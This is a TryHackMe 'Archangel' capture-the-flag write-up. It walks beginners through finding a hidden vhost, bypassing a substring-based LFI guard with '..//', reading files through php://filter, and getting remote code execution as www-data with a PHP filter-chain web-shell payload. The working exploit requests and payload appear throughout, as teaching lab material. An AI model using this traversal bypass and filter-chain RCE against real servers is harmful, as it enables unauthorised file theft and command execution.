---
description: "TryHackMe Archangel — two web sites hiding on one IP address, and a PHP include filter that turns out to be a string test rather than a path rule. The second hostname is invisible to 25,000 Host headers and is written in the default site's own contact line. The include guard blocks the literal substring '../..', which reads like path traversal protection and is not: '..//' contains no '../..' and PHP resolves the empty segment to the parent anyway. Reading test.php through php://filter answers question 4 immediately and hands you the guard's source verbatim, and every one of those facts is a lever — including the fact that the guard only requires its token to appear ANYWHERE in the parameter, which is what lets a filter-chain RCE point its resource at an ordinary file. Ends in RCE as www-data with nothing written to the box. Every command explained for a total beginner, and all four wrong turns kept in — including a decoder of my own that reported a confident 18-byte read of a 1359-byte file."
---

# Archangel — the filter that blocked one spelling of traversal, not traversal

**TryHackMe · challenge: Archangel · target: `10.x.x.x` (the lab IP changes per lease)**

> **Flags are redacted in this write-up.** The commands, payloads, dead ends and reasoning are all
> here — those are what teach. The flag strings themselves teach nothing; they are just proof you
> were there, and publishing them hands the room's answers to the next person instead of letting
> them earn it. The hostname, the file paths and the payload are kept, because you cannot follow
> the method without them.

| # | question | answer |
|---|---|---|
| 1 | find a different hostname | `mafialive.thm` |
| 2 | find flag 1 | `thm{[redacted]}` |
| 3 | find a page under development | `/test.php` (plus `/robots.txt`, which disallows it) |
| 4 | find flag 2 | `thm{[redacted]}` |
| 5 | get a shell, find the user flag | `thm{[redacted]}` — RCE as `uid=33(www-data)`, nothing written to the box |

**What I kept and why:** the hostname `mafialive.thm`, `/test.php`, `/home/archangel/user.txt`, the
`..//` bypass, and the 5831-character filter-chain payload. Every one of those *is* the technique —
remove them and the write-up becomes a list of unexplained screenshots. The three flag strings are
pure prize and are redacted.

---

## What you need to know before we start

- A **port** is a numbered door into a running service. Port 80 is the usual web door, 22 is SSH (a
  remote command line).
- A **virtual host** (vhost) is one webserver answering for several domain names, choosing the site
  from the `Host:` header the browser sent. So one IP can serve several unrelated sites, and the
  "default" one is served to every request naming no known host. This is the whole reason question 1
  is a real question here: the second site exists and nothing advertises it.
- **LFI** (Local File Inclusion) is a bug where the application takes a path from the query string
  and hands it to PHP's `include`. `include` reads the file **and runs it as PHP** if it contains PHP
  tags. That second half is the danger.
- **RCE** (Remote Code Execution) means you can run your own commands on the box.
- **UID** is a user id. `uid=33` is the low-privilege `www-data` account Apache runs as — not root,
  but a shell.

---

## Phase 1 — Recon

### Two ports, and that is all of them

```bash
nmap -Pn -p- --min-rate 3000 -T4 10.x.x.x
```

- `-p-` — scan all 65535 TCP ports.
- `-Pn` — skip the host-discovery ping and treat the host as up. Targets behind a VPN often drop
  that ping while their services are perfectly reachable, so without this nmap can call the host
  "down" and skip the real work.
- `--min-rate 3000 -T4` — send at least 3000 packets/second. Fast, but a lab VM is 1 vCPU; do not
  push `-t 80` or you will knock the box over and then be debugging your own traffic.

Result: exactly two open ports, 65,533 refused.

- `22/tcp` — OpenSSH 7.6p1 Ubuntu
- `80/tcp` — Apache/2.4.29 (Ubuntu) with `mod_php`

**Port 8080 is closed.** Public walkthroughs for this room describe a second webserver on 8080. This
deployment folded it into Apache on 80 as a vhost. An hour on a writeup, then a dead end. If a
writeup and the box disagree, the box is the room.

### Question 1 — the hostname 25,000 headers could not find

```bash
curl -sS -D - -o /dev/null -H "Host: archangel.thm" http://10.x.x.x/
```

`-H` adds a request header. `-D -` dumps the response headers, `-o /dev/null` discards the body.
`archangel.thm` — the room's own name — returned the default site, byte for byte. Same md5, same
ETag.

So I fuzzed. `gobuster vhost` sends a `Host:` header per candidate name and discards anything that
comes back the same size as the default site:

```bash
gobuster vhost -u http://10.x.x.x -w subdomains-top1million-20000.txt --append-domain thm \
  --exclude-length 19188 -t 60 --timeout 5s
```

25,000 candidate names, bare and with `.thm` appended. **Zero hits.** The only things that looked
like hits were `Host: www` and `Host: mail`, which are HTTP 400 from Apache — malformed requests, not
sites.

**The answer was in the page I already had.** `support@mafialive.thm`, sitting in the contact line of
the default site's own HTML. Make that a habit: when a name will not come out of enumeration, *read
what you have*. Contact lines, copyright footers, JS bundles, certificates.

```bash
curl -sS -H "Host: mafialive.thm" http://10.x.x.x/
```

```
<h1>UNDER DEVELOPMENT</h1>
thm{[redacted]}
```

The whole vhost root is 59 bytes. **That is flag 1** — the entire page is the answer.

### The decoy worth knowing about

`/flags/` is a real directory with `mod_autoindex` on — Apache generates a listing for a directory
with no index file. It lists one entry, `flag.html`, 93 bytes:

```html
<meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
```

A Rick-roll. A directory named `flags`, autoindexed, in the room whose question 4 asks for a flag.
Reporting that file means you harvested nothing. I mention it because the next person will find it
too.

### Two host behaviours that will bite you

**A filter rejection comes back as HTTP 200.** Any tool that decides success from the status code
scores a *rejection* as a success. Every test below reads the body, not the status.

**Several directories return HTTP 200 with zero bytes.** They are empty placeholder index files. A
status-only sweep calls them hits; a size-only diff calls them noise. Calibrate per path before
choosing a filter.

---

## Phase 2 — The LFI, and the filter that was not one

`/test.php` exists **only** on the `mafialive.thm` vhost — a 404 on the default site. So asking for
it by IP finds nothing, which is why question 3 ("a page under development") is really question 1
again.

```bash
curl -sS -H "Host: mafialive.thm" "http://10.x.x.x/test.php?view=/var/www/html/development_testing/mrrobot.php"
```

That works — 308 bytes, renders `Control is an illusion`. But:

```bash
curl -sS -H "Host: mafialive.thm" "http://10.x.x.x/test.php?view=/etc/passwd"
```

returns 310 bytes of `Sorry, Thats not allowed`, **with HTTP status 200**. A status-code check calls
that a successful arbitrary file read of `/etc/passwd`.

---

## Phase 3 — Question 4's hint, taken literally

The hint is *"Best way to exploit lfi is to look at the code"*. It means exactly that. Not more
filenames — the source.

The naive way to read it does not work: `view=/var/www/html/development_testing/test.php` makes the
page `include` **itself**, recursing until PHP gives up — HTTP 500, truncated body. The hint is right
and the obvious method is wrong.

The fix is PHP's **filter wrapper**. `php://filter` transforms a file as it is read, so it *reads*
the source without *executing* it:

```
php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

- `convert.base64-encode` — Base64-encode the content as it is read.
- `resource=` — which file to read.

Three reasons this is right and not just clever:

1. **Base64 is mandatory, not decoration.** Raw `<?php` in an included file gets parsed and
   swallowed by the engine and you see nothing. Encoding survives that.
2. **It does not execute**, so no recursive self-include, no HTTP 500.
3. **It contains no `../`**, so the traversal filter never fires — obvious only *after* you read the
   filter, which is step 4.

### Controls first — before believing any of it

A negative is worth only the probe that produced it; a positive is worth only a control.

**Positive control**, a file whose exact content I already knew from normal HTTP:

```
php://filter/convert.base64-encode/resource=/var/www/html/development_testing/robots.txt
```

Decoded to `User-agent: *\nDisallow: /test.php\n` — 34 bytes, matching what the server hands out at
`/robots.txt` exactly. That one request proved *both* that the wrapper is allowed and that the read
is real.

**Negative control**, the same wrapper pointed at a path I made up: the bare 286-byte page, no
Base64, no error, nothing. So a missing file produces silence and a real file produces content — the
two are distinguishable, which is the only reason the positive means anything.

Two more for independence: `read=string.rot13` on the same file gave `Hfre-ntrag: *`, and `PHP://` in
uppercase worked identically. A trick that only worked one way would deserve suspicion.

### The source, and flag 2

```php
//FLAG: thm{[redacted]}

function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
    include $_GET['view'];
}else{
    echo 'Sorry, Thats not allowed';
}
}
```

**That is flag 2.** And the source hands you the rest of the room.

---

## Phase 4 — `..//`, the whole rest of the mission

Look at the guard twice:

```php
!containsStr($_GET['view'], '../..')                          // must NOT contain this
containsStr($_GET['view'], '/var/www/html/development_testing') // MUST contain this
```

Both are **string tests**. Nothing canonicalises the path, nothing resolves it. The filter blocks one
four-character substring. It does not block traversal — it blocks one *spelling* of it.

Which means: find a spelling that resolves the same way and does not spell `../..`.

```
..//     contains "../.."?   no.
         PHP resolves?       yes — the empty segment collapses to the parent
```

So, with the wrapper doing the reading and four levels of that:

```
php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

No `../..` anywhere. The required docroot string is present. `/etc/passwd` comes back, 1359 bytes.

I tested six spellings rather than trusting one, because an empty read means "not there" **or** "my
request never arrived" — the two are indistinguishable:

| spelling | contains `../..` | result |
|---|---|---|
| `..//` ×4 | no | **read succeeded** |
| `....//` ×4 | no | empty — passes the filter, does not resolve |
| `../.` ×4 | **yes** | blocked |
| `..%2f` ×4 | no | empty — `include` does not URL-decode |
| `..\/` ×4 | no | empty |
| `/./` ×4 | no | empty — no traversal at all |

One spelling out of six both passes the string test and resolves. That is the proof the filter is a
substring test and not a path restriction.

`/proc/self/cmdline` returned `/usr/sbin/apache2`, and `error.log` gave up
`include_path='.:/usr/share/php'`. So: Apache, PHP 7.2, working directory is the docroot, and **no
`open_basedir`** — that last one is why reading outside the docroot works at all.

### Question 5's flag, without a shell

```bash
curl -sS -H "Host: mafialive.thm" \
 "http://10.x.x.x/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//home/archangel/user.txt"
```

`/etc/passwd` had already given the candidate: `archangel`, uid 1001, home `/home/archangel`, shell
`/bin/bash` — the only interactive non-system account on the box.

```
thm{[redacted]}
```

**Worth sitting with:** the room asks for a shell, and the flag does not need one. A file read is
the lowest rung that reaches the answer; a shell is a higher one. Do the low thing first, then get
the shell for the technique rather than as a prerequisite.

---

## Phase 5 — The shell, and the technique that leaves nothing behind

Question 5's hint is *"Poison!!!"* — **log poisoning**. Put PHP into a file the server writes (the
Apache access log records every request's User-Agent, so your User-Agent lands in it), then
`include` the log. It works here; I confirmed both logs are readable through the LFI (`access.log`
9.8 MB, `error.log` 1.9 MB).

**I did not use it**, and the reason is worth more than the technique. Poisoning a log means writing
executable content into a file I cannot remove without root, on a lab box other people share. That is
a cleanup debt taken on for one rung of extra capability.

The **PHP filter-chain** gets RCE with nothing written anywhere:

```bash
git clone --depth 1 https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
```

Chained `iconv` charset conversions abuse documented `iconv` behaviour to emit attacker-chosen bytes
in front of the resource, forging a complete `<?php …?>` payload in memory. `include` then runs it. No
upload endpoint, no writable path, no log access, no persistence — and **nothing to clean up**. It
also survives `open_basedir` and unreadable logs, because the forged content comes from `php://temp`
rather than from a file.

One adjustment. The guard requires `/var/www/html/development_testing` to appear *somewhere* in the
value, and the generated chain's resource is `php://temp`, which does not contain it:

```
resource=php://temp   →   resource=/var/www/html/development_testing/mrrobot.php
```

This costs nothing, and understanding why is the actual lesson. The forged bytes come from the
**conversion tables, not from the resource** — the resource only has to be openable. So the required
token is satisfied and the payload is unaffected.

**The generalisable point:** a guard that requires a token *anywhere* in a parameter is not a
sandbox. It is a substring test wearing a sandbox's clothes. Find where the parameter's real work
happens, satisfy the token anywhere, and keep going.

```
$ id       → uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami   → www-data
$ hostname → ubuntu
$ cat /home/archangel/user.txt → thm{[redacted]}
```

Command goes in `&c=`, output comes back in the response body. The user flag now agrees across two
independent channels — the LFI read and the RCE — which is the point of having two.

---

## The wrong turns

Four. Three of them mine, and two of those nearly cost me a conclusion.

### A wordlist aimed at the room you are already standing in

The automated recon ran ~330 name probes as `development_testing/FUZZ` — inside the one directory the
LFI had already granted — then concluded flag 2 was unreachable inside the boundary. It never once ran
`development_testing/../FUZZ`.

The filter was handing out exactly one `../`. The parent directory was reachable the entire time.

> **Rule:** a wordlist pointed at a directory you already have access to is a measurement of nothing.
> Sweep the parent, or say out loud that the boundary was never crossed.

### My decoder matched the page furniture

The first `/etc/passwd` attempt came back as 18 bytes of garbage. My Base64 extractor used a regex
over the whole response — and the page's own link is

```
href="/test.php?view=/var/www/html/development_testing/mrrobot.php"
```

46 characters drawn from exactly the character class my regex wanted (`[A-Za-z0-9+/]`). It matched the
static chrome and I decoded **the link**. I reported a confident 18-byte "read" of a file that is
1359 bytes.

> **Rule:** diff the response against a baseline to locate an embedded payload; never regex the
> whole page. And make the extractor prove itself on content you already know before you let it
> read anything new. Mine reproduced `robots.txt` at exactly 34 bytes first. Without that control the
> garbage would have been believed.

### My own double prefix

With the decoder fixed, `/etc/passwd` came back empty. I very nearly wrote that up as a filesystem
restriction. It was my bug: I passed a full absolute path into a helper that *already* prepended the
docroot, producing

```
/var/www/html/development_testing//var/www/html/development_testing/…
```

A path that cannot exist. One `print` of the exact string I sent would have caught it.

> **Rule:** an empty read is ambiguous between "not there" and "my request never arrived". Print the
> exact request before you conclude a restriction is real.

### A pipeline failure that was not the target's fault

The automated run twice refused to proceed past a *policy* check, complaining that recon "attempted
`other`, which its role does not own". Nothing to do with the box. The classifier reads the program
name out of a parsed command, and **any** shell-bearing line — `cd x && curl …`, a `for` loop —
fails to parse and lands in a catch-all bucket no role is allowed to use. A bare `curl` classifies
correctly. Fixed by issuing one command per call.

The tempting "fix" was to grant that catch-all bucket to the recon role. That would have been wrong,
and checking first is the only reason it was not applied: the bucket covers *unparseable shell*,
which includes anything mutating. Granting it would have handed a read-only role the exact
capability whose absence the policy exists to guarantee.

> **Rule:** when a policy blocks you, read what the bucket actually contains before widening it.

---

## Teardown

Nothing to tear down, and checked rather than claimed.

- No scanner, fuzzer, cracker or listener was ever started. `ps` shows only my editor.
- No file was written to the target. Every request was a plain `GET` — no upload, no log injection.
- The filter-chain is stateless. Nothing persists, so there is nothing to remove.
- The only artefact is a 156 KB clone in my own `/tmp`, outside the target.

One unavoidable trace: Apache logs every request, so my requests are in `access.log`. I did not
inject that and cannot remove it. Taking the filter-chain over log poisoning is precisely what kept
the *planted* part of that log clean.

---

## Cost, and an honest note on how this was worked

The reconnaissance was done by an automated pipeline I wrote earlier, run twice. Both runs **failed**
at a stage where a size check could not be satisfied — the auditing stage had to read two large
automatic outputs in full under a fixed byte limit, and there is no truncation available, so raising
the limit only moved the failure. I have written that up in full, with the numbers, because it cost
two runs and about 3.3 million tokens and produced zero flags.

**The pipeline produced the reconnaissance. It did not produce a single flag.** The five answers came
from the hand work above, where I captured every response myself — so they are verified, but they
were never machine-gated, and no independent audit looked at them.

The part I would carry to the next box: the hand work that finished this room was about two minutes
and under 100 requests, because the recon had already found the vhost and the endpoint. The expensive
lesson was not in the exploitation at all. It was in a 46-character `href` in a page's own HTML
beating a decoder I had not tested.
